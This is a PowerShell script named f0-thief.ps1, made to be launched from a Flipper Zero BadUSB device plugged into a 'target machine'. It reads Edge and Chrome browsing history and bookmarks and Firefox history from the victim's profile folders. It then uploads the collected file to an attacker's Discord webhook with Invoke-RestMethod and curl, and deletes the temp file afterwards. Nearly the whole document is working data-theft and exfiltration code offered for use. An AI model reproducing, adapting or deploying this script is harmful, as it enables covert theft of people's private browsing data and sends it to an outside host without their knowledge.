<#
.SYNOPSIS
    Name: f0-thief.ps1
    The purpose of this script is to read and export browser histories & bookmarks.

.DESCRIPTION
    This script is designed to work in conjunction with "Thieve.txt" to extract Edge, Chrome & Firefox browser history/bookmarks.
    This script will read: Edge & Chrome browser history + bookmarks and Firefox history only.
    The output will be sent to Discord if you provide a valid Webhook URL.

.NOTES
    Version:    0.1

    Author:     Contrxl

    Updated:    12/06/2024      -First version of standalone script.

.LINK 
    https://github.com/contrxl/flipper-stuff/tree/main/badusb

.EXAMPLE
    To run this as intended with FlipperZero:
        - Take a copy of "Thieve.txt"
        - Insert your Discord Webhook URL in the $dc variable.
        - Upload "Thieve.txt" to your FlipperZero in the SDCard/badusb/ folder.
        - Connect FlipperZero to target machine and run "Thieve.txt" from badusb.
#>

$FileName = "$ENV:tmp/$ENV:USERNAME-BrowserData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"

$regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

$edg_history = "$ENV:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
$chr_history = "$ENV:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"

$edg_bkmarks = "$ENV:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
$chr_bkmarks = "$ENV:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"

$ffx_history = "$ENV:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\"

<#
.SYNOPSIS
This function identifies all Firefox profiles present. These store places.sqlite which is read to display browser history. If no places.sqlite is found in a 
profile, that profile is ignored.
#>
function readFirefoxHistory{
    if (-not (Test-Path $ffx_history)){
        "[-] No FireFox history found."
    }
    else{
        $profiles = Get-ChildItem -Path "$ffx_history\*.default*\"
        $ffx_history = ForEach($profile in $profiles) {
            $data = Test-Path "$profile\places.sqlite"
            if ($data){
                "`n$profile"
                "="*40
                Get-Content $profile\places.sqlite | Select-String -Allmatches $regex | ForEach-Object {($_.Matches.Value)} | Sort-Object -Unique
            }
        }
    }
    return $ffx_history
}
$ffx_history = readFirefoxHistory
$ffx_history >> $FileName

<#
.SYNOPSIS
This function identifies all Edge & Chrome browser histories.
#>
function readHistory{
    $rdhistory = @(
    
    $edg_history
    $chr_history
    )

    $history = ForEach ($histories in $rdhistory) {
        "`n$histories"
        "="*40
        Get-Content $histories | Select-String -Allmatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique
    }
    return $history
}
$history = readHistory
$history >> $FileName

<#
.SYNOPSIS
This function identifies all Edge & Chrome browser bookmarks.
#>
function readBookmarks{
    $rdbkmarks = @(
        
    $edg_bkmarks
    $chr_bkmarks
    )

    $bookmark = ForEach ($bkmark in $rdbkmarks) {
        "`n$bkmark"
        "="*40
        Get-Content $bkmark | Select-String -Allmatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique
    }
    return $bookmark
}
$bookmark = readBookmarks
$bookmark >> $FileName

<#
.SYNOPSIS
This function uploads the collected data to your Discord channel when an API key is provided as $dc.
#>
function exfilDiscord {
    [CmdletBinding()]
    param(
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )

    $webHook = "$dc"

    $body = @{
        'username' = $ENV:USERNAME
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHook -Method Post -Body ($body | ConvertTo-Json)};

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $webHook
    }
}

# Checks the $dc value is not empty, and if so, sends the file to Discord.
if (-not ([string]::IsNullOrEmpty("$dc"))){
   exfilDiscord -file $FileName 
}

# Clean up Temp file created.
Remove-Item $FileName